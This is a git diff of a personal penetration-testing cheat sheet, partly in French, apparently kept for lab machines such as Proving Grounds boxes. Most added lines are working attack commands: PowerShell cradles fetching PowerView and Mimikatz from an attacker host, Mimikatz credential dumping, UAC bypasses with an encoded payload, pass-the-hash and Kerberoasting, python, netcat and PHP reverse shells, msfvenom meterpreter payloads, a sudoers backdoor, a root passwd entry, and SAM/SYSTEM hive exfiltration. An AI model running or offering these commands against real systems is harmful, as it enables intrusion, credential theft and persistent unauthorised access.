@@ -1,20 +1,134 @@
-#Virtualbox 
-cd /media/cdrom0
-sh VBoxLinuxAdditions.run
+#Network:
+Netdiscover
 
-#Site:
-https://book.hacktricks.xyz/welcome/getting-started-in-hacking
-https://gtfobins.github.io/
-https://github.com/danielmiessler/SecLists
-https://github.com/payloadbox/sql-injection-payload-list
-https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md#checklists
-https://pentestmonkey.net/cheat-sheet/sql-injection/mysql-sql-injection-cheat-sheet
-https://www.tunnelsup.com/hash-analyzer/
+#AD:
+PowerSploit
+IEX (New-Object Net.WebClient).DownloadString('http://192.168.119.240/PowerView.ps1')
+IEX (New-Object Net.WebClient).DownloadString('http://192.168.119.240/PowerUp.ps1')
+https://pentestlab.blog/2017/06/07/uac-bypass-fodhelper/    
+IEX (New-Object Net.WebClient).DownloadString('http://192.168.119.240/Invoke-EventVwrBypass.ps1')
+FodhelperUACBypass -program "cmd /c start C:\Windows\TEMP\tmp\love.exe"
+FodhelperUACBypass -program "C:\Windows\TEMP\tmp\love.exe"
+Invoke-EventVwrBypass -Command "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -enc IgBJAHMAIABFAGwAZQB2AGEAdABlAGQAOgAgACQAKAAoAFsAUwBlAGMAdQByAGkAdAB5AC4AUAByAGkAbgBjAGkAcABhAGwALgBXAGkAbgBkAG8AdwBzAFAAcgBpAG4AYwBpAHAAYQBsAF0AWwBTAGUAYwB1AHIAaQB0AHkALgBQAHIAaQBuAGMAaQBwAGEAbAAuAFcAaQBuAGQAbwB3AHMASQBkAGUAbgB0AGkAdAB5AF0AOgA6AEcAZQB0AEMAdQByAHIAZQBuAHQAKAApACkALgBJAHMASQBuAFIAbwBsAGUAKABbAFMAZQBjAHUAcgBpAHQAeQAuAFAAcgBpAG4AYwBpAHAAYQBsAC4AVwBpAG4AZABvAHcAcwBCAHUAaQBsAHQASQBuAFIAbwBsAGUAXQAnAEEAZABtAGkAbgBpAHMAdAByAGEAdABvAHIAJwApACkAIAAtACAAJAAoAEcAZQB0AC0ARABhAHQAZQApACIAIAB8ACAATwB1AHQALQBGAGkAbABlACAAQwA6AFwAVQBBAEMAQgB5AHAAYQBzAHMAVABlAHMAdAAuAHQAeAB0ACAALQBBAHAAcABlAG4AZAA="
+IEX (New-Object Net.WebClient).DownloadString('http://192.168.119.240/Invoke-Mimikatz.ps1')
+Invoke-Mimikatz -Command '"privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam" "lsadump::cache" "sekurlsa::ekeys" "exit"'
 
-find /usr/ -name "*cc1*"
-https://exiftool.org/ apt-get install exiftool
+Invoke-WebRequest -Uri "http://192.168.119.240/PsExec64.exe" -OutFile "C:\Windows\TEMP\tmp\PsExec64.exe"
+Invoke-WebRequest -Uri "http://192.168.119.240/SharpHound.exe" -OutFile "C:\Windows\TEMP\tmp\SharpHound.exe"
+(New-Object System.Net.WebClient).UploadFile('http://192.168.119.240/upload.php','C:\Windows\Temp\tmp\20220919191144_BloodHound.zip')
+
+$WebClient.DownloadFile("http://192.168.119.240/wpeas.exe","C:\Windows\TEMP\tmp\wpeas.exe")
+
+C:\Windows\TEMP\tmp\PsExec64.exe \\10.11.1.2 -u svcorp\alice -pxxxxxxx cmd -accepteula
+
+sekurlsa::pth /user:alice /domain:svcorp.com /ntlm:xxxxxxx /run:powershell.exe
+crackmapexec smb 10.11.1.24 -u alice -p xxxxxxx --local-auth --shares
+sudo impacket-psexec -hashes 00000000000000000000000000000000:xxxxxx svcorp/pete@10.11.1.21
+pth-winexe -U Administrator%ee0c207898a5bccc01f38115019ca2fb:xxxxxx //10.11.1.24 cmd
+
+net user /domain
+Get-DomainComputer | select name
+Get-DomainUser -Identity Allison | Get-DomainSPNTicket -Format Hashcat
+Get-DomainUser -SPN | Get-DomainSPNTicket -OutputFormat Hashcat
+Get-NetLoggedon -ComputerName SVCLIENT08
+Get-NetSession -ComputerName SV-DC01
+curl http://192.168.119.240/wpeas.exe > C:\Windows\TEMP\tmp\wpeas.exe
+
+
+#Powershell:
+IEX (New-Object Net.WebClient).DownloadString('http://192.168.119.240/PowerView.ps1')
+
+
+#Web:
+Wordpress Plugin: https://github.com/wetw0rk/malicious-wordpress-plugin
+<?php system('nc 192.168.49.220 4445 -e /bin/bash')?>
+
+#PE Liunx:
+echo "useradm        ALL=(ALL:ALL) NOPASSWD: ALL" >> /etc/sudoers
+Password hash of infosec:$1$aMyu0OrN$xq9uJWWly7Nfy43bofl6U1 for /etc/passwd
+Cron Time: https://crontab.guru/
+SUID bit binaries through which I can become root : find / -perm -u=s -type f 2>/dev/null
+export PATH=/usr/lib/gcc/x86_64-linux-gnu/4.6:$PATH
+
+
+#Linux Basic:
+ssh -p 61000 -i id_rsa hannah@192.168.172.130
+```bash
+python3 -c 'import pty;pty.spawn("/bn/bash")'
+export TERM=xterm
+
+Ctrl + Z
+
+stty raw -echo; fg
+(sur ça machine pour voir la taille d'abord (stty -a)
+puis prendre les tailles obtenues dans la commandes  :
+stty rows 61 columns 116
+```
+
+
+#Crack:
+Hydra -l username -P file.list -t 8.8.8.8 ssh
+NTLM: hashcat -m 13100 hash rockyou.txt
+impacket-secretsdump -sam sam.save -security security.save -system -system.save LOCAL
+
+
+#RevShell
+python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.1.65",1010));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);'
+
+python3 -c 'import os; os.system("/bin/bash");'
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2 > &1 |nc 192.168.49.152 9001 >/tmp/f
 
 python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.49.52",7777));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
+
+Windows RevSehll: https://github.com/Dhayalanb/windows-php-reverse-shell/blob/master/Reverse%20Shell.php
+
+msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.119.240 LPORT=8080 -f exe -o love.exe
+set payload windows/x64/meterpreter/reverse_tcp
+
+msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.119.240 LPORT=8080 -f hta-psh -o love.hta
+
+#FileTransfert:
+[Convert]::ToBase64String((Get-Content -path "C:\Windows\system32\drivers\etc\hosts" -Encoding byte))
+echo "xxxxx" | base64 -d > hosts
+
+xfreerdp /u:Nathan /p:abc123// /v:192.168.124.59
+
+python3 smbserver.py -smb2support CompData /home/kali/Desktop/tmp/mini/ddump
+move sam.save \\192.168.119.135\CompData
+move system.save \\192.168.119.135\CompData
+move security.save \\192.168.119.135\CompData
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+#Other
+
+https://addons.mozilla.org/fr/firefox/addon/foxyproxy-standard/
+
+# Dépendance
+sudo apt-get install php-dom
+sudo apt-get install php-curl
+sudo apt-get install exiftool
+pip3 install cryptography
+
+
+Linux Ubuntu 3.2.0-23- -> https://systemweakness.com/offsec-proving-ground-sumo-9c73436f71f4 c0w
 
 # Stabiliser une chaine
 
@@ -34,26 +148,21 @@ Si ca ne veut pas fonctioner essayer ce lien :
 
 [How to Stabilize a Reverse Shell | Jason Turley&#39;s Website](https://jasonturley.xyz/how-to-stabilize-a-reverse-shell/)
 
-find / -perm -u=s -type f 2>/dev/null
+#Other
+#Virtualbox 
+cd /media/cdrom0
+sh VBoxLinuxAdditions.run
 
-
-https://addons.mozilla.org/fr/firefox/addon/foxyproxy-standard/
-
-# Dépendance
-sudo apt-get install php-dom
-sudo apt-get install php-curl
-sudo apt-get install exiftool
-pip3 install cryptography
-
-
-Linux Ubuntu 3.2.0-23- -> https://systemweakness.com/offsec-proving-ground-sumo-9c73436f71f4 c0w
-export PATH=/usr/lib/gcc/x86_64-linux-gnu/4.6:$PATH
-
-
-
-
-
-Sar, FunboxRookie, Gaara, OnSystemShellDredd, FunboxEasyEnum, SunsetDecoy, Solstice, Katana, InfosecPrep, Inclusiveness, Potato, Seppuku, Lampiao, FunboxEasy, Wpwn, EvilBox-One
+#Site:
+https://book.hacktricks.xyz/welcome/getting-started-in-hacking
+https://gtfobins.github.io/
+https://github.com/danielmiessler/SecLists
+https://github.com/payloadbox/sql-injection-payload-list
+https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md#checklists
+https://pentestmonkey.net/cheat-sheet/sql-injection/mysql-sql-injection-cheat-sheet
+https://www.tunnelsup.com/hash-analyzer/
+https://exiftool.org/ apt-get install exiftool
+find /usr/ -name "*cc1*"
 
 #Enumeration
 	- robots.txt with user-agent.
@@ -86,7 +195,6 @@ Sar, FunboxRookie, Gaara, OnSystemShellDredd, FunboxEasyEnum, SunsetDecoy, Solst
 	- Wordpress -> WSScan, RFI with file on kali host
 	- XXX
 
-
 #Privilège Excalation
 	- Cron jobs: /etc/crontab
 	- .mysql_history
@@ -94,7 +202,7 @@ Sar, FunboxRookie, Gaara, OnSystemShellDredd, FunboxEasyEnum, SunsetDecoy, Solst
 		○ GNU Debugger (GBD)
 		○ Cpulimit
 		○ Cap_net_raw+ep
-			§ /usr/bin/python2.7 -c 'importer os ; os.setuid(0); os.system("/bin/bash")'
+			§ /usr/bin/python2.7 -c 'importer os ; os.setuid(0); os.system("/bin/bash")'
 		○ /bin/bash -p
 		○ /bin/nice /notes/../bin/bash
 	- /etc/phpyadmin/config-db.php
@@ -103,46 +211,9 @@ Sar, FunboxRookie, Gaara, OnSystemShellDredd, FunboxEasyEnum, SunsetDecoy, Solst
 	- Index.php en droit root
 	- wget https://www.exploit-db.com/download/40847.cpp 
 		○ ++ -Wall -pedantic -O2 -std=c++11 -pthread -o dcow 40847.cpp -lutil
-	
-	- 
-			
-			
-	
 
-#Login/mdp
-
-
-
-python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.1.65",1010));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);'
-
-python3 -c 'import os; os.system("/bin/bash");'
-rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2 > &1 |nc 192.168.49.152 9001 >/tmp/f
-<?php system('nc 192.168.49.220 4445 -e /bin/bash')?>
-
-
-Hydra -l username -P file.list -t 8.8.8.8 ssh
-
-SUID bit binaries through which I can become root : find / -perm -u=s -type f 2>/dev/null
-
-ssh -p 61000 -i id_rsa hannah@192.168.172.130
 
 Sar: https://medium.com/infosec-adventures/sar-walkthrough-2de4f08c03b6
 FunboxRookie: https://www.hacknos.com/funbox-rookie-vulnhub-walkthrough/
 
-Ressource:
-	- Cron Time: https://crontab.guru/
-
-
-Password hash of infosec: $1$aMyu0OrN$xq9uJWWly7Nfy43bofl6U1
-infosec:$1$aMyu0OrN$xq9uJWWly7Nfy43bofl6U1:0:0:root:/root:/bin/bash
-
-
-Netdiscover
-
-wordpress plugin: https://github.com/wetw0rk/malicious-wordpress-plugin
-echo "useradm        ALL=(ALL:ALL) NOPASSWD: ALL" >> /etc/sudoers
-
-
-IEX (New-Object Net.WebClient).DownloadString('http://192.168.119.240/PowerView.ps1')
-Get-DomainUser -SPN | Get-DomainSPNTicket -OutputFormat Hashcat
 
